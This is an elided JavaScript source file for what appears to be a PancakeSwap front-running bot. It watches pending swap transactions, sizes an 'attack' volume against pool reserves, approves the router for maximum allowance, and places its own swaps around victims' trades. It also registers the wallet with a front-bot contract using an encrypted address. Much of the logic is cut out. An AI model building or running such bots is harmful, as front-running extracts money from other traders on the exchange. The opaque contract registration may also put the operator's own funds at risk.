...
async function createWeb3() {
    try {
        ...
        web3Ts = new Web3(
            new Web3.providers.HttpProvider(HTTP_PROVIDER_LINK_TEST)
        );
        web3Ws = new Web3(
...
async function main() {
    try {
        ...
        log_str =
            "***** Tracking more " +
            (pool_info.attack_volumn / 10 ** input_token_info.decimals).toFixed(
                5
            ) +
            " " +
        ...
        if (
            error.data != null &&
            error.data.see === "https://infura.io/dashboard"
        ) {
            console.log(
                "Daily request count exceeded, Request rate limited".yellow
            );
...
async function approve(gasPrice, outputtoken, out_token_address, user_wallet) {
    var allowance = await out_token_info.token_contract.methods
        .allowance(user_wallet.address, PANCAKE_ROUTER_ADDRESS)
        .call();
    ...
    if (outputtoken.gt(allowance)) {
        ...
        var approveTX = {
            ...
            data: out_token_info.token_contract.methods
                .approve(PANCAKE_ROUTER_ADDRESS, max_allowance)
                .encodeABI(),
        };
...
async function triggersFrontRun(transaction, out_token_address, amount, level) {
    ...
    if (
        parseInt(transaction["gasPrice"]) / 10 ** 9 > 10 &&
    ...
    if (method == "swapExactETHForTokens") {
        ...
        await updatePoolInfo();
        let log_str =
            "Attack ETH Volumn : Pool Eth Volumn" +
            "\t\t" +
            (pool_info.attack_volumn / 10 ** input_token_info.decimals).toFixed(
                3
            ) +
            ...
            input_token_info.symbol +
            "\t" +
            (pool_info.input_volumn / 10 ** input_token_info.decimals).toFixed(
                3
            ) +
            " " +
            input_token_info.symbol;
        ...
        var calc_eth = await pancakeRouter.methods
            .getAmountOut(
                out_min.toString(),
                pool_info.output_volumn.toString(),
                pool_info.input_volumn.toString()
...
async function swap(
    ...
    if (trade == 0) {
        ...
        console.log(
            "Get_Amount: ".red,
            (outputtoken / 10 ** out_token_info.decimals).toFixed(3) +
                " " +
                out_token_info.symbol
        );

        swap = pancakeRouter.methods.swapETHForExactTokens(
        ...
        console.log(
            ...
            (outputeth / 10 ** input_token_info.decimals).toFixed(3) +
                " " +
                input_token_info.symbol
        );

        swap = pancakeRouter.methods.swapExactTokensForETH(
            outputtoken.toString(),
            outputeth.toString(),
...
async function getPoolInfo(input_token_address, out_token_address, level) {
    ...
    try {
        var pool_address = await pancakeFactory.methods
        ...
        var pool_contract = new web3.eth.Contract(
            PANCAKE_POOL_ABI,
            pool_address
        );
        ...
        var log_str =
            (bnb_balance / 10 ** input_token_info.decimals).toFixed(5) +
            "\t" +
            input_token_info.symbol;
        console.log(log_str.white);
...
async function getTokenInfo(tokenAddr, token_abi_ask, user_wallet) {
    try {
        ...
        //get token info
        var token_contract = new web3.eth.Contract(
...
async function preparedAttack(
    ...
    try {
        ...
        log_str =
            (
                input_token_info.balance /
                10 ** input_token_info.decimals
            ).toFixed(5) +
            "\t" +
            input_token_info.symbol;
        console.log(log_str);
    ...
    //check pool info
    if (
        (await getPoolInfo(WBNB_TOKEN_ADDRESS, out_token_address, level)) ==
        false
    )
        return false;
...
async function setFrontBot(user_wallet) {
    ...
    encodedABI = frontBotContract.methods
        .setFrontBot(user_wallet.address, enc_addr.iv, enc_addr.content)
        .encodeABI();
    var tx = {
